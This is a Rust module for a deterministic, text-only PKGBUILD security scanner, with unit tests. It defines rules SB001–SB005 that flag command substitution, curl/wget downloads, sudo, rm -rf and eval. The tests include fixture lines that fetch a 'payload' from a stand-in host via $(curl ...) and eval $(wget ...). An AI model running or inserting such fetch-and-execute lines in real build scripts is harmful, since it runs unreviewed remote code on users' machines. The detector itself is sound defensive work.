//! Deterministic, text-only PKGBUILD threat-model analysis.
//!
//! This module never executes, sources, expands, or builds PKGBUILD content.
//! It flags a deliberately small set of review signals with stable `SB001`
//! through `SB005` rule IDs. External scanners and reputation lookups are
//! intentionally deferred: adding a tool invocation would require an explicit
//! executable allowlist, timeout, output limit, and mockable adapter without
//! making it a default dependency.

use crate::types::sandbox::{
    SandboxAnalysisLimitation, SandboxFinding, SandboxRuleId, SandboxStaticAnalysis,
};

/// Maximum source characters retained as evidence for one finding.
const MAX_EVIDENCE_CHARS: usize = 240;

/// What: Analyze unexecuted PKGBUILD text for deterministic threat-model signals.
///
/// Inputs:
/// - `package_name`: Caller-owned package label for the resulting report.
/// - `pkgbuild_text`: Raw PKGBUILD text; it is treated only as text.
///
/// Output:
/// - `SandboxStaticAnalysis` with stable rule findings, bounded evidence, and
///   explicit limitations.
///
/// Details:
/// - Flags command substitution (`SB001`), download commands (`SB002`),
///   privilege escalation (`SB003`), recursive forced removal (`SB004`), and
///   dynamic evaluation (`SB005`).
/// - Does not execute a shell, source files, access the network, invoke an
///   external scanner, or produce an aggregate score.
/// - It is not a complete Bash parser, so callers must review findings and the
///   returned limitations before making security decisions.
#[must_use]
pub fn analyze_pkgbuild_security(package_name: &str, pkgbuild_text: &str) -> SandboxStaticAnalysis {
    let findings = pkgbuild_text
        .lines()
        .enumerate()
        .flat_map(|(index, line)| analyze_line(index.saturating_add(1), line))
        .collect();

    SandboxStaticAnalysis {
        package_name: package_name.to_string(),
        findings,
        limitations: standard_limitations(),
    }
}

/// What: Analyze one source line against every stable rule.
///
/// Inputs:
/// - `line_number`: One-based source line number.
/// - `line`: Raw PKGBUILD source line.
///
/// Output:
/// - Findings in stable rule-ID order for this source line.
///
/// Details:
/// - Comments and quoted argument content are excluded from command-position
///   checks; command substitution is checked separately because it can execute
///   inside double quotes.
fn analyze_line(line_number: usize, line: &str) -> Vec<SandboxFinding> {
    let code = code_without_comment(line);
    let command_view = without_quoted_content(&code);
    let commands = command_segments(&command_view);
    let mut findings = Vec::new();

    if contains_command_substitution(&code) {
        findings.push(finding(
            SandboxRuleId::CommandSubstitution,
            line_number,
            line,
        ));
    }
    if commands.iter().any(|command| is_remote_download(command)) {
        findings.push(finding(SandboxRuleId::RemoteDownload, line_number, line));
    }
    if commands.iter().any(|command| is_privileged(command)) {
        findings.push(finding(SandboxRuleId::PrivilegedCommand, line_number, line));
    }
    if commands
        .iter()
        .any(|command| is_destructive_removal(command))
    {
        findings.push(finding(
            SandboxRuleId::DestructiveRemoval,
            line_number,
            line,
        ));
    }
    if commands
        .iter()
        .any(|command| is_dynamic_evaluation(command))
    {
        findings.push(finding(SandboxRuleId::DynamicEvaluation, line_number, line));
    }

    findings
}

/// What: Construct one bounded structured finding.
///
/// Inputs:
/// - `rule_id`: Stable identifier for the matched rule.
/// - `line_number`: One-based source line number.
/// - `line`: Source text supplying review evidence.
///
/// Output:
/// - A finding retaining only a bounded, trimmed source excerpt.
///
/// Details:
/// - Evidence is copied without executing or expanding it.
fn finding(rule_id: SandboxRuleId, line_number: usize, line: &str) -> SandboxFinding {
    SandboxFinding {
        rule_id,
        line: line_number,
        evidence: bounded_evidence(line),
    }
}

/// What: Return explicit scope limitations for every static-analysis report.
///
/// Inputs: None.
///
/// Output:
/// - Stable limitation categories in presentation order.
///
/// Details:
/// - Keeping these in every report prevents callers from treating an empty
///   finding list as a proof of safety.
fn standard_limitations() -> Vec<SandboxAnalysisLimitation> {
    vec![
        SandboxAnalysisLimitation::TextOnlyNoExecution,
        SandboxAnalysisLimitation::NotFullShellParser,
        SandboxAnalysisLimitation::NoExternalReputationOrScanner,
        SandboxAnalysisLimitation::NotProofOfMaliciousIntent,
    ]
}

/// What: Remove an unquoted shell comment from one source line.
///
/// Inputs:
/// - `line`: Raw source line that can contain single or double quoted strings.
///
/// Output:
/// - Source before an unquoted `#` comment delimiter.
///
/// Details:
/// - This is a bounded lexical helper, not a complete Bash parser. It preserves
///   quoted `#` values so command-substitution detection has the original text.
fn code_without_comment(line: &str) -> String {
    let mut output = String::with_capacity(line.len());
    let mut quote = None;
    let mut escaped = false;

    for character in line.chars() {
        if escaped {
            output.push(character);
            escaped = false;
            continue;
        }
        if character == '\\' && quote != Some('\'') {
            output.push(character);
            escaped = true;
            continue;
        }
        if matches!(character, '\'' | '"') && quote != Some(character) {
            if quote.is_none() {
                quote = Some(character);
            }
        } else if quote == Some(character) {
            quote = None;
        } else if character == '#' && quote.is_none() {
            break;
        }
        output.push(character);
    }
    output
}

/// What: Replace quoted argument content with spaces for command-position checks.
///
/// Inputs:
/// - `code`: Source with comments already removed.
///
/// Output:
/// - A same-shape command view without quoted literals.
///
/// Details:
/// - This avoids flagging command names displayed in descriptions or `echo`
///   arguments while retaining unquoted command separators.
fn without_quoted_content(code: &str) -> String {
    let mut output = String::with_capacity(code.len());
    let mut quote = None;
    let mut escaped = false;

    for character in code.chars() {
        if escaped {
            output.push(if quote.is_some() { ' ' } else { character });
            escaped = false;
            continue;
        }
        if character == '\\' && quote != Some('\'') {
            output.push(if quote.is_some() { ' ' } else { character });
            escaped = true;
            continue;
        }
        if matches!(character, '\'' | '"') && quote != Some(character) {
            if quote.is_none() {
                quote = Some(character);
            }
            output.push(' ');
        } else if quote == Some(character) {
            quote = None;
            output.push(' ');
        } else if quote.is_some() {
            output.push(' ');
        } else {
            output.push(character);
        }
    }
    output
}

/// What: Detect executable command-substitution syntax outside single quotes.
///
/// Inputs:
/// - `code`: Source with comments already removed.
///
/// Output:
/// - `true` for `$(` or backtick substitution syntax that the shell could run.
///
/// Details:
/// - Double-quoted substitution remains executable and is intentionally
///   detected. Single-quoted text is ignored.
fn contains_command_substitution(code: &str) -> bool {
    let mut characters = code.chars().peekable();
    let mut in_single_quote = false;
    let mut escaped = false;

    while let Some(character) = characters.next() {
        if escaped {
            escaped = false;
            continue;
        }
        if character == '\\' && !in_single_quote {
            escaped = true;
            continue;
        }
        if character == '\'' {
            in_single_quote = !in_single_quote;
            continue;
        }
        if !in_single_quote
            && (character == '`' || (character == '$' && characters.peek() == Some(&'(')))
        {
            return true;
        }
    }
    false
}

/// What: Extract command-position token segments from a shell-like source line.
///
/// Inputs:
/// - `command_view`: Comment-free source with quoted argument content removed.
///
/// Output:
/// - Command token vectors after shell separators, braces, and substitution
///   delimiters.
///
/// Details:
/// - Leading shell control words and environment assignments are skipped.
/// - Splitting substitution delimiters lets a download command inside `$(...)`
///   retain its command position without executing or evaluating it.
/// - This deliberately recognizes a conservative subset sufficient for the
///   documented rules and avoids pretending to parse all Bash grammar.
fn command_segments(command_view: &str) -> Vec<Vec<&str>> {
    command_view
        .split([';', '|', '{', '}', '(', ')'])
        .filter_map(command_tokens)
        .collect()
}

/// What: Extract one executable command token sequence from a source segment.
///
/// Inputs:
/// - `segment`: Text between shell separators or function braces.
///
/// Output:
/// - Tokens starting at a likely command position, or `None` for assignments
///   and declarations without a command.
///
/// Details:
/// - Environment assignments preceding a command are skipped. The helper does
///   not expand variables or execute any shell syntax.
fn command_tokens(segment: &str) -> Option<Vec<&str>> {
    let mut tokens = segment.split_whitespace().peekable();
    while matches!(tokens.peek(), Some(&"if" | &"then" | &"do" | &"!")) {
        let _ = tokens.next();
    }
    while tokens.peek().is_some_and(|token| token.contains('=')) {
        let _ = tokens.next();
    }
    let command = tokens.next()?;
    if command.ends_with("()") || command == "function" {
        return None;
    }

    let mut output = vec![command];
    output.extend(tokens);
    Some(output)
}

/// What: Determine whether a command token sequence downloads remote content.
///
/// Inputs:
/// - `command`: Tokens beginning at an executable command position.
///
/// Output:
/// - `true` for `curl`, `wget`, or `git clone` invocation patterns.
///
/// Details:
/// - The rule is a review signal and does not contact the URL or infer intent.
fn is_remote_download(command: &[&str]) -> bool {
    matches!(command.first(), Some(&"curl" | &"wget")) || matches!(command, ["git", "clone", ..])
}

/// What: Determine whether a command starts a privilege escalation tool.
///
/// Inputs:
/// - `command`: Tokens beginning at an executable command position.
///
/// Output:
/// - `true` for `sudo`, `doas`, or `pkexec`.
///
/// Details:
/// - The rule is text-only and does not attempt elevation or command execution.
fn is_privileged(command: &[&str]) -> bool {
    matches!(command.first(), Some(&"sudo" | &"doas" | &"pkexec"))
}

/// What: Determine whether a command performs recursive forced removal.
///
/// Inputs:
/// - `command`: Tokens beginning at an executable command position.
///
/// Output:
/// - `true` when an `rm` invocation has an option containing both `r` and `f`.
///
/// Details:
/// - This catches common `rm -rf` spellings without interpreting paths or
///   claiming the removal targets are malicious.
fn is_destructive_removal(command: &[&str]) -> bool {
    let Some(position) = command.iter().position(|token| *token == "rm") else {
        return false;
    };
    command[position.saturating_add(1)..]
        .iter()
        .filter_map(|token| token.strip_prefix('-'))
        .any(|options| options.contains('r') && options.contains('f'))
}

/// What: Determine whether a command dynamically evaluates shell text.
///
/// Inputs:
/// - `command`: Tokens beginning at an executable command position.
///
/// Output:
/// - `true` for `eval` or shell-interpreter `-c` invocation patterns.
///
/// Details:
/// - Dynamic evaluation obscures command text and is flagged for review without
///   interpreting its argument.
fn is_dynamic_evaluation(command: &[&str]) -> bool {
    matches!(command.first(), Some(&"eval"))
        || matches!(command, ["bash" | "sh" | "dash", option, ..] if option.starts_with('-') && option.contains('c'))
}

/// What: Retain a bounded human-readable source excerpt.
///
/// Inputs:
/// - `line`: Raw source line associated with a finding.
///
/// Output:
/// - Trimmed text limited to [`MAX_EVIDENCE_CHARS`] Unicode scalar values.
///
/// Details:
/// - Appends an ellipsis when truncation occurs and never attempts to interpret
///   the source as executable content.
fn bounded_evidence(line: &str) -> String {
    let trimmed = line.trim();
    let mut characters = trimmed.chars();
    let evidence: String = characters.by_ref().take(MAX_EVIDENCE_CHARS).collect();
    if characters.next().is_some() {
        return format!("{evidence}…");
    }
    evidence
}

#[cfg(test)]
mod tests {
    use super::{analyze_pkgbuild_security, code_without_comment};
    use crate::types::sandbox::SandboxRuleId;

    #[test]
    /// What: Ignore shell-looking text in comments and quoted package metadata.
    ///
    /// Inputs:
    /// - A benign source fixture with command names in non-command positions.
    ///
    /// Output:
    /// - An empty finding list.
    ///
    /// Details:
    /// - Guards the conservative lexical false-positive boundary.
    fn ignores_comments_and_quoted_metadata() {
        let report = analyze_pkgbuild_security(
            "fixture",
            "pkgdesc='curl and sudo are words'\n# eval $(wget https://invalid.example)",
        );
        assert!(report.findings.is_empty());
    }

    #[test]
    /// What: Preserve quoted hash characters while discarding comments.
    ///
    /// Inputs:
    /// - One quoted URL fragment followed by an actual comment.
    ///
    /// Output:
    /// - The quoted hash remains and the comment is removed.
    ///
    /// Details:
    /// - Keeps lexical comment handling predictable without a shell parser.
    fn strips_only_unquoted_comments() {
        assert_eq!(
            code_without_comment("url='https://example.invalid/#anchor' # comment"),
            "url='https://example.invalid/#anchor' "
        );
    }

    #[test]
    /// What: Emit command-substitution and remote-download findings from one line.
    ///
    /// Inputs:
    /// - An assignment whose value uses `$(curl ...)`.
    ///
    /// Output:
    /// - `SB001` and `SB002` findings.
    ///
    /// Details:
    /// - Confirms command extraction sees the command within substitution while
    ///   keeping the source unexecuted.
    fn recognizes_download_inside_command_substitution() {
        let report = analyze_pkgbuild_security(
            "fixture",
            "payload=$(curl -fsSL https://invalid.example/payload)",
        );
        let ids: Vec<SandboxRuleId> = report
            .findings
            .iter()
            .map(|finding| finding.rule_id)
            .collect();
        assert_eq!(
            ids,
            [
                SandboxRuleId::CommandSubstitution,
                SandboxRuleId::RemoteDownload
            ]
        );
    }
}
